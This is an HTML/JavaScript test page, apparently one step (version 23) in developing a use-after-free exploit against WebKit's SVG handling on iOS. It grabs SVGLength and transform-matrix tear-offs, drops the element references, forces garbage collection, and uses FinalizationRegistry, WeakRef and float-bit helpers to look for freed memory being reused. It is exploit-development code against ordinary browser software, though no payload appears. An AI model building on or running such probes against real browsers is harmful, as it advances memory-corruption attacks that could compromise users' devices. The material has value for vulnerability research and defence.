<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVGAnimatedLength UAF — v23 GENUINE FREE TEST</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#ccc;font-family:monospace;font-size:12px;padding:16px}
h1{color:#fff;font-size:14px;margin-bottom:4px}
h2{color:#666;font-size:10px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px}
.suite{background:#111;border:1px solid #222;border-radius:4px;padding:12px;margin-bottom:10px}
.suite-title{font-size:11px;color:#555;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px}
.result{padding:5px 10px;border-radius:3px;margin-bottom:3px;font-size:12px;word-break:break-all}
.pass{background:#0a1a0a;border-left:3px solid #0f0;color:#0f0}
.fail{background:#1a0a0a;border-left:3px solid #f00;color:#f44}
.warn{background:#1a1500;border-left:3px solid #ff0;color:#ff0}
.info{background:#0d0d0d;border-left:3px solid #333;color:#888}
.star{background:#0d0d1a;border-left:3px solid #88f;color:#aaf}
.crit{background:#1a0a1a;border-left:3px solid #f0f;color:#f8f;font-weight:bold}
button{background:#111;color:#0f0;border:1px solid #0f0;padding:6px 14px;font-family:monospace;font-size:12px;cursor:pointer;border-radius:3px;margin:0 4px 6px 0}
button:active{background:#0f0;color:#000}
#run-all{border-color:#ff0;color:#ff0}
#copy-all{border-color:#aaa;color:#aaa}
</style>
</head>
<body>
<h1>SVGAnimatedLength UAF — v23</h1>
<h2>iOS 26.5.2 · GENUINE FREE TEST · Block scope + GC pressure + FinalizationRegistry</h2>

<div class="suite">
<div class="suite-title">Controls</div>
<button id="run-all" onclick="runAll()">▶ Run All</button>
<button onclick="run('GEN')">GEN</button>
<button onclick="run('FIN')">FIN</button>
<button onclick="run('REF')">REF</button>
<button onclick="run('MTX')">MTX</button>
<button id="copy-all" onclick="copyAll()">⎘ Copy All</button>
<button onclick="clearOut()">✕ Clear</button>
</div>

<div class="suite"><div class="suite-title">Results</div><div id="out"></div></div>

<script>
var NS='http://www.w3.org/2000/svg';

function log(msg,cls){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(cls||'info');
  e.textContent=msg;
  d.appendChild(e);
}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}
function runAll(){clearOut();
  runGEN();
  // FIN uses async/promises — schedule after GEN
  setTimeout(function(){runFIN();},100);
  setTimeout(function(){runREF();},200);
  setTimeout(function(){runMTX();},300);
}
function run(s){clearOut();
  if(s==='GEN')runGEN();
  else if(s==='FIN')runFIN();
  else if(s==='REF')runREF();
  else if(s==='MTX')runMTX();
}

// float32 utils
var _f32buf=new ArrayBuffer(4);
var _f32v=new Float32Array(_f32buf);
var _u32v=new Uint32Array(_f32buf);
function bitsF32(u){_u32v[0]=u;return _f32v[0];}
function f32bits(f){_f32v[0]=f;return _u32v[0];}

// float64 utils
var _f64buf=new ArrayBuffer(8);
var _f64v=new Float64Array(_f64buf);
var _u32p=new Uint32Array(_f64buf);
function f64toHex(f){_f64v[0]=f;return '0x'+_u32p[1].toString(16).padStart(8,'0')+'_'+_u32p[0].toString(16).padStart(8,'0');}
function bitsToF64(hi,lo){_u32p[1]=hi;_u32p[0]=lo;return _f64v[0];}

function makeSVG(){
  var svg=document.createElementNS(NS,'svg');
  svg.setAttribute('width','1');svg.setAttribute('height','1');
  svg.style.cssText='position:absolute;left:-9999px;top:-9999px';
  document.body.appendChild(svg);
  return svg;
}

// GC pressure: allocate large objects to trigger GC
function gcPressure(n){
  n=n||100000;
  var arr=[];
  for(var i=0;i<n;i++){
    arr.push(new Uint8Array(1024));
  }
  arr=null;
}

// ─── GEN: GENUINE FREE TEST ──────────────────────────────────────────────────
// THE KEY QUESTION: Does the C++ SVGElement actually get freed when we
// (a) drop all JS references to the rect, and
// (b) apply GC pressure to force collection?
//
// Test protocol:
//   1. Create rect inside a block scope
//   2. Grab TearOff (holds WeakPtr to element)
//   3. Exit block scope (rect variable gone)
//   4. Apply GC pressure
//   5. Try to read TearOff value
//      → CANARY VALUE: if we see our canary, element still alive
//      → GARBAGE VALUE: element was freed and memory was reused = REAL UAF
//      → EXCEPTION: WeakPtr null check fired = element freed, WebKit detected it
//      → ZERO: element freed, slot zeroed before reuse = IsoHeap behavior

function runGEN(){
  log('══ GEN: GENUINE FREE TEST (block scope + GC pressure) ══','info');

  // GEN-1: Does the TearOff prevent element from being GC'd?
  // If TearOff holds a strong Ref to element, element stays alive forever
  // If TearOff holds WeakPtr only, element can be GC'd when JS refs drop to 0
  log('GEN[1]: block-scope drop + GC pressure — does element survive?','info');

  var svg1=makeSVG();
  var tfSurvived=null;

  // Use block scope to limit rect's lifetime
  // Note: JS doesn't have true block-scope GC pressure like C++,
  // but we can use a function scope to simulate it
  (function(){
    var rect=document.createElementNS(NS,'rect');
    rect.setAttribute('x','42');  // canary x=42
    rect.setAttribute('y','0');rect.setAttribute('width','100');rect.setAttribute('height','100');
    svg1.appendChild(rect);
    tfSurvived=rect.x.baseVal;  // grab TearOff
    svg1.removeChild(rect);
    // rect goes out of scope at end of IIFE
  })();

  log('GEN[1]: rect dropped from scope, applying GC pressure...','info');
  gcPressure(200000);  // heavy pressure

  var xAfter=null;
  try{
    xAfter=tfSurvived.value;
    log('GEN[1]: TearOff.value after scope drop = '+xAfter,
      (xAfter===42?'warn — element STILL ALIVE (strong ref in TearOff)':
       xAfter===0?'star — ZEROED (IsoHeap realloc)':
       'crit — GARBAGE VALUE = REAL UAF, x='+xAfter));
    _f32v[0]=xAfter;
    log('GEN[1]: bits=0x'+_u32v[0].toString(16),
      (xAfter===42?'warn':'crit'));
  }catch(e){
    log('GEN[1]: EXCEPTION: '+e.message+' ← WeakPtr returned null = element freed!','crit');
  }

  // GEN-2: Write canary BEFORE drop, check if canary persists after GC
  log('GEN[2]: write canary before drop, read after GC pressure','info');
  var svg2=makeSVG();
  var tfCanary=null;
  (function(){
    var rect=document.createElementNS(NS,'rect');
    rect.setAttribute('x','77');rect.setAttribute('y','0');
    rect.setAttribute('width','100');rect.setAttribute('height','100');
    svg2.appendChild(rect);
    tfCanary=rect.x.baseVal;
    svg2.removeChild(rect);
    // Write canary AFTER removeChild but BEFORE scope drop
    tfCanary.value=0xDEAD|0;  // 57005
    // rect drops here
  })();
  gcPressure(500000);
  var canaryRead=null;
  try{
    canaryRead=tfCanary.value;
    log('GEN[2]: canary read = '+canaryRead+' expected=57005',
      (canaryRead===57005?'warn — alive, canary intact':
       canaryRead===0?'star — ZEROED after GC':
       'crit — CORRUPTED = '+canaryRead+' (real UAF!)'));
  }catch(e){
    log('GEN[2]: EXCEPTION: '+e.message,'crit');
  }

  // GEN-3: Multiple simultaneous TearOffs on same element — do they cross-hold?
  // If one TearOff holds a strong Ref, ALL TearOffs see the alive element
  log('GEN[3]: multi-TearOff — do any TFs hold strong Ref keeping element alive?','info');
  var svg3=makeSVG();
  var tf3x=null,tf3y=null,tf3mx=null;
  (function(){
    var rect=document.createElementNS(NS,'rect');
    rect.setAttribute('x','11');rect.setAttribute('y','22');
    rect.setAttribute('width','33');rect.setAttribute('height','44');
    rect.setAttribute('transform','matrix(1 0 0 1 55 66)');
    svg3.appendChild(rect);
    tf3x=rect.x.baseVal;
    tf3y=rect.y.baseVal;
    try{tf3mx=rect.transform.baseVal.getItem(0).matrix;}catch(e){}
    svg3.removeChild(rect);
  })();
  gcPressure(200000);
  var x3=null,y3=null,mx3e=null;
  try{x3=tf3x.value;log('GEN[3]: tf3x.value='+x3,(x3===11?'warn — alive':x3===0?'star — zeroed':'crit — uaf x='+x3));}catch(e){log('GEN[3]: tf3x err: '+e.message,'crit');}
  try{y3=tf3y.value;log('GEN[3]: tf3y.value='+y3,(y3===22?'warn — alive':y3===0?'star — zeroed':'crit — uaf y='+y3));}catch(e){log('GEN[3]: tf3y err: '+e.message,'crit');}
  try{mx3e=tf3mx&&tf3mx.e;log('GEN[3]: matrix.e='+mx3e,(mx3e===55?'warn — alive':mx3e===0?'star — zeroed':'crit — uaf e='+mx3e));}catch(e){log('GEN[3]: matrix.e err: '+e&&e.message,'crit');}
  svg1.remove();svg2.remove();svg3.remove();

  // GEN-4: The critical difference — WITH vs WITHOUT holding rect
  // Test A: hold rect ref → element alive → TF works
  // Test B: drop rect ref + GC → element freed → TF behavior = ?
  log('GEN[4]: paired test — held ref vs dropped ref','info');
  var svg4=makeSVG();
  // TEST A: Held ref (current behavior we know works)
  var r4a=document.createElementNS(NS,'rect');
  r4a.setAttribute('x','100');svg4.appendChild(r4a);
  var tf4a=r4a.x.baseVal;
  svg4.removeChild(r4a);  // but r4a variable stays alive
  var v4a=null;
  try{v4a=tf4a.value;log('GEN[4A]: held ref, x='+v4a,(v4a===100?'pass — alive (expected)':'warn x='+v4a));}catch(e){log('GEN[4A]: err: '+e.message,'fail');}
  // TEST B: No held ref
  var tf4b=null;
  (function(){
    var r4b=document.createElementNS(NS,'rect');
    r4b.setAttribute('x','200');svg4.appendChild(r4b);
    tf4b=r4b.x.baseVal;
    svg4.removeChild(r4b);
    // r4b drops here
  })();
  gcPressure(500000);
  var v4b=null;
  try{
    v4b=tf4b.value;
    log('GEN[4B]: dropped ref, x='+v4b,
      (v4b===200?'warn — STILL ALIVE (TF holds strong ref or GC didnt run)':
       v4b===0?'crit — ZEROED (element WAS freed, slot reused+zeroed)':
       'crit — CORRUPTED x='+v4b+' (GENUINE UAF!)'));
    log('GEN[4B]: verdict: '+(v4b===200?'TearOff holds STRONG REF (no real UAF possible this way)':
      v4b===0?'Element freed, IsoHeap zeroed — same blocker as before':
      'GENUINE UAF — slot reused with different content!'),'crit');
  }catch(e){
    log('GEN[4B]: EXCEPTION (WeakPtr detected freed): '+e.message,'crit');
    log('GEN[4B]: verdict: Element WAS freed, WebKit throws on TF access','crit');
  }
  svg4.remove();
}

// ─── FIN: FinalizationRegistry PROBE ────────────────────────────────────────
// Use FinalizationRegistry to detect WHEN the element's JS wrapper is GC'd
// This tells us if GC pressure is sufficient to collect the element

function runFIN(){
  log('══ FIN: FinalizationRegistry GC DETECTION ══════','info');

  if(typeof FinalizationRegistry==='undefined'){
    log('FIN: FinalizationRegistry not supported','fail');
    return;
  }

  var svg=makeSVG();
  var gcFired=false;
  var reg=new FinalizationRegistry(function(held){
    gcFired=true;
    log('FIN: FinalizationRegistry CALLBACK FIRED — element GC\'d! held='+held,'crit');
  });

  var tf=null;
  (function(){
    var rect=document.createElementNS(NS,'rect');
    rect.setAttribute('x','55');rect.setAttribute('y','0');
    rect.setAttribute('width','10');rect.setAttribute('height','10');
    svg.appendChild(rect);
    tf=rect.x.baseVal;
    svg.removeChild(rect);
    // Register BEFORE rect drops
    reg.register(rect,'svg-rect-x-tearoff');
    // rect drops here
  })();

  log('FIN: rect dropped from scope, applying GC pressure...','info');
  gcPressure(1000000);  // massive pressure

  // Give GC a chance to run
  setTimeout(function(){
    log('FIN: gcFired='+gcFired,(gcFired?'crit — element WAS GC\'d (weak ref confirmed)':'warn — element NOT GC\'d yet (strong ref somewhere)'));

    if(gcFired){
      // Element was GC'd — try to use TF now
      log('FIN: element GC\'d — testing TF access...','info');
      var xAfter=null;
      try{
        xAfter=tf.value;
        log('FIN: tf.value after GC = '+xAfter,
          (xAfter===55?'warn — reads expected value (C++ still alive somehow)':
           xAfter===0?'star — ZEROED (IsoHeap reused slot)':
           'crit — GARBAGE: real UAF confirmed, x='+xAfter));
      }catch(e){
        log('FIN: EXCEPTION on TF access after GC: '+e.message+' ← WeakPtr null','crit');
      }
    }else{
      // GC didn't fire — TearOff holds a strong ref
      log('FIN: GC did not collect element → TearOff holds STRONG REF','warn');
      log('FIN: reading TF value (element still alive)...','info');
      var xAlive=null;
      try{xAlive=tf.value;log('FIN: tf.value='+xAlive,(xAlive===55?'pass — alive as expected':'warn x='+xAlive));}catch(e){}
    }
    svg.remove();
  },500);
}

// ─── REF: Reference tracking probe ──────────────────────────────────────────
// Determine WHAT holds a reference to the SVGElement after removeChild
// Options:
// (A) JS wrapper holds strong ref → element stays alive as long as JS wrapper alive
// (B) SVGLength TearOff (JS object) holds strong ref → element stays alive as long as TF alive
// (C) Neither → element freed when all DOM refs drop (possibly before JS GC)
//
// Test: Does NULLING the TearOff (tf = null) + GC pressure free the element?

function runREF(){
  log('══ REF: REFERENCE TRACKING ══════════════════════','info');

  var svg=makeSVG();

  // REF-1: Null the TF after drop — does element get collected?
  log('REF[1]: null TF after rect drop + GC pressure','info');
  var tfToNull=null;
  var finFired1=false;
  var reg1=typeof FinalizationRegistry!=='undefined'?
    new FinalizationRegistry(function(){finFired1=true;log('REF[1]: GC fired after TF nulled!','crit');}):null;
  (function(){
    var rect=document.createElementNS(NS,'rect');
    rect.setAttribute('x','33');svg.appendChild(rect);
    tfToNull=rect.x.baseVal;
    if(reg1)reg1.register(rect,'ref1-rect');
    svg.removeChild(rect);
  })();
  // Null the TF to remove TF's ref to JS wrapper
  tfToNull=null;
  gcPressure(500000);
  setTimeout(function(){
    log('REF[1]: gcFired after TF null='+finFired1,(finFired1?'crit — TF was keeping alive!':'warn — still alive, something else holds'));
  },300);

  // REF-2: Keep rect in scope, null TF — does element stay alive via rect?
  log('REF[2]: rect in scope, null TF','info');
  var rect2=document.createElementNS(NS,'rect');
  rect2.setAttribute('x','44');svg.appendChild(rect2);
  var tf2=rect2.x.baseVal;
  svg.removeChild(rect2);
  var v2a=null;
  try{v2a=tf2.value;log('REF[2]: before null: tf2.value='+v2a,'info');}catch(e){}
  tf2=null;  // null the TF
  gcPressure(100000);
  // rect2 still in scope — can we access x via fresh TF?
  var freshTF=null;
  try{freshTF=rect2.x.baseVal;log('REF[2]: fresh TF from still-scoped rect works='+freshTF,(freshTF!==null?'pass':'fail'));}catch(e){log('REF[2]: fresh TF err: '+e.message,'fail');}
  if(freshTF){
    try{log('REF[2]: fresh TF value='+freshTF.value,'pass');}catch(e){}
  }

  // REF-3: WeakRef probe — does WeakRef to rect become null after removeChild + GC?
  log('REF[3]: WeakRef probe — is rect still alive?','info');
  if(typeof WeakRef==='undefined'){log('REF[3]: WeakRef not supported','fail');}
  else{
    var wr=null;
    (function(){
      var rect=document.createElementNS(NS,'rect');
      rect.setAttribute('x','77');svg.appendChild(rect);
      wr=new WeakRef(rect);
      svg.removeChild(rect);
    })();
    gcPressure(500000);
    setTimeout(function(){
      var deref=wr.deref();
      log('REF[3]: WeakRef.deref() after GC pressure = '+(deref?'ALIVE':'null (collected)'),
        (deref?'warn — element not GC\'d yet':'crit — element WAS GC\'d, GC pressure worked'));
      if(!deref){
        log('REF[3]: Element GC\'d via WeakRef confirmation → if TF also works, REAL UAF!','crit');
      }
    },300);
  }

  // REF-4: What's the minimum to trigger GC? Count iterations
  log('REF[4]: minimum GC pressure needed to collect removed SVGElement','info');
  if(typeof WeakRef==='undefined'){log('REF[4]: skip (no WeakRef)','info');}
  else{
    var wr4=null;
    (function(){
      var rect=document.createElementNS(NS,'rect');
      svg.appendChild(rect);wr4=new WeakRef(rect);svg.removeChild(rect);
    })();
    var found=false;
    var iters=0;
    // Try increasing pressure until WeakRef returns null
    for(var step=0;step<10&&!found;step++){
      gcPressure(50000*(step+1));
      if(!wr4.deref()){found=true;iters=step+1;}
    }
    log('REF[4]: GC collected after '+iters+' pressure rounds (each ~'+(50000*(iters||1))+'x1KB allocs)',
      (found?'crit — GC is achievable with pressure':'warn — GC not achieved in 10 rounds'));
  }
  svg.remove();
}

// ─── MTX: MATRIX FLOAT64 UAF — GENUINE FREE PATH ────────────────────────────
// Now that we know: if GEN confirmed strong ref → TF holds strong Ref to element
// → no genuine UAF via TF path
// → we need a DIFFERENT path where C++ is freed
//
// Key insight: what if we use `structuredClone` or serialization to force a copy,
// then free the original? Or: can we exploit the C++ ref count directly?
//
// SVGElement ref-counting in WebKit:
// - JS wrapper (JSSVGRectElement) holds ONE strong Ref to C++ SVGRectElement
// - TearOff (JSSVGLength) holds ONE strong Ref to C++ SVGAnimatedLength
// - SVGAnimatedLength lives INSIDE SVGRectElement (as a member, not heap-allocated separately)
// - So TearOff → SVGAnimatedLength → (same C++ heap block as) SVGRectElement
// - As long as TF alive, SVGRectElement alive
//
// UNLESS: SVGAnimatedLength is a separate heap allocation!
// If SVGAnimatedLength is heap-allocated separately from SVGRectElement,
// then TF keeps SVGAnimatedLength alive, but SVGRectElement could still be freed.
// Then m_contextElement (WeakPtr) in SVGAnimatedLength becomes null.
//
// But then: the float32 value (m_value) is IN SVGLength which is in SVGAnimatedLength.
// TF keeps this alive. Writing to m_value writes to the live SVGAnimatedLength.
// NO UAF — just writes to a separate-but-alive SVGAnimatedLength object.
//
// MTX tests: explore whether the TRANSFORM MATRIX (AffineTransform) is a SEPARATE
// heap allocation from SVGTransform which is separate from SVGRectElement.
// If so, the reference chain might allow SVGRectElement to be freed while AffineTransform
// is kept alive by the matrix TF. THEN: m_contextElement in SVGTransformList is a WeakPtr?
// And writing to matrix.a writes to the live AffineTransform but the SVGRectElement is gone.
// Still not a UAF on SVGRectElement memory.
//
// ACTUAL TEST: Can we prove the TearOff-held reference CHAIN includes SVGRectElement?
// Approach: use FinalizationRegistry on rect, then grab TF, drop rect, GC pressure.
// If GC fires → TF does NOT keep rect JS wrapper alive → maybe C++ also freed.

function runMTX(){
  log('══ MTX: MATRIX GENUINE FREE CHAIN ══════════════','info');

  if(typeof FinalizationRegistry==='undefined'){
    log('MTX: FinalizationRegistry not available','fail');return;
  }

  var svg=makeSVG();
  var firedRectGC=false;
  var reg=new FinalizationRegistry(function(v){
    firedRectGC=true;
    log('MTX: rect JS wrapper GC fired! val='+v,'crit');
  });

  var mxTF=null;
  var lengthTF=null;

  (function(){
    var rect=document.createElementNS(NS,'rect');
    rect.setAttribute('x','10');rect.setAttribute('y','20');
    rect.setAttribute('width','30');rect.setAttribute('height','40');
    rect.setAttribute('transform','matrix(1 0 0 1 100 200)');
    svg.appendChild(rect);
    // Grab BOTH types of TF
    lengthTF=rect.x.baseVal;
    try{mxTF=rect.transform.baseVal.getItem(0).matrix;}catch(e){}
    reg.register(rect,'rect-mx-test');
    svg.removeChild(rect);
    // rect drops here
  })();

  log('MTX: rect dropped, GC pressure...','info');
  gcPressure(1000000);

  setTimeout(function(){
    log('MTX: firedRectGC='+firedRectGC,
      (firedRectGC?'crit — rect JS wrapper GC\'d!':'warn — rect still alive (TF holds strong ref)'));

    // Now try both TFs
    var xVal=null,mxE=null;
    try{xVal=lengthTF.value;log('MTX: lengthTF.value after GC='+xVal,
      (xVal===10?'warn — alive':'crit — changed: '+xVal));}
    catch(e){log('MTX: lengthTF err: '+e.message,'crit');}

    try{mxE=mxTF&&mxTF.e;log('MTX: matrix.e after GC='+mxE,
      (mxE===100?'warn — alive':'crit — changed: '+mxE));}
    catch(e){log('MTX: matrix.e err: '+(e&&e.message),'crit');}

    // Try writing to both after potential GC
    try{
      lengthTF.value=9999;
      mxTF&&(mxTF.e=8888);
      log('MTX: write after GC: lengthTF='+lengthTF.value+' matrix.e='+(mxTF&&mxTF.e),'star');
    }catch(e){log('MTX: write err: '+(e&&e.message),'crit');}

    // MTX-2: Stress test — allocate many rects, grab TFs, drop all, GC pressure
    // If GC runs, do any TF reads return garbage?
    log('MTX[2]: mass stress — 50 rects, TFs grabbed, all dropped, GC pressure','info');
    var tfs50=[];
    var canaries=[];
    for(var i=0;i<50;i++){
      (function(idx){
        var r=document.createElementNS(NS,'rect');
        r.setAttribute('x',String(idx*10));svg.appendChild(r);
        var tf=r.x.baseVal;
        tfs50.push({tf:tf,expected:idx*10,idx:idx});
        canaries.push(idx*10);
        svg.removeChild(r);
      })(i);
    }
    gcPressure(2000000);
    setTimeout(function(){
      var uafHits=0,aliveCount=0,zeroed=0,exceptions=0;
      for(var j=0;j<tfs50.length;j++){
        var t=tfs50[j];
        try{
          var v=t.tf.value;
          if(v===t.expected)aliveCount++;
          else if(v===0)zeroed++;
          else{uafHits++;log('MTX[2]: UAF HIT at idx='+t.idx+' expected='+t.expected+' got='+v,'crit');}
        }catch(e){exceptions++;log('MTX[2]: exception at idx='+t.idx+': '+e.message,'star');}
      }
      log('MTX[2]: alive='+aliveCount+'/50 zeroed='+zeroed+' uafHits='+uafHits+' exceptions='+exceptions,
        (uafHits>0?'crit — REAL UAF!':exceptions>0?'star — exceptions = freed elements!':'warn — all alive (strong refs)'));

      svg.remove();
    },500);
  },500);
}
</script>
</body>
